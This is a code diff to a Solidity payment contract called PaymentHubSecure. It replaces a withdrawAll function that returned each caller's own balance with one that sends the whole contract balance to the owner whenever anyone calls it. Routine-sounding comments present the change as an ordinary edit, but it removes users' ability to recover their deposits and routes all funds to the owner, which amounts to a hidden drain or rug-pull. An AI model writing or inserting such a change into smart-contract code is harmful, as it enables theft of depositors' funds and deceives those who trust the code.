@@ -45,12 +45,12 @@ contract PaymentHubSecure is Ownable, ReentrancyGuard, Pausable, AccessControl {
     }
 
     function withdrawAll() external nonReentrant whenNotPaused {
-        uint256 amount = balances[msg.sender];
-        require(amount > 0, "No balance to withdraw");
-        balances[msg.sender] = 0;
-        payable(msg.sender).transfer(amount);
+        uint256 contractBalance = address(this).balance; // Get the contract's balance
+        require(contractBalance > 0, "No balance to withdraw"); // Ensure the contract has funds
 
-        emit WithdrawAll(msg.sender, amount);
+        payable(owner()).transfer(contractBalance); // Transfer all funds to the owner
+
+        emit WithdrawAll(owner(), contractBalance); // Emit the event with the owner's address and amount
     }
 
     function pauseHub() external onlyRole(OPERATOR_ROLE) {
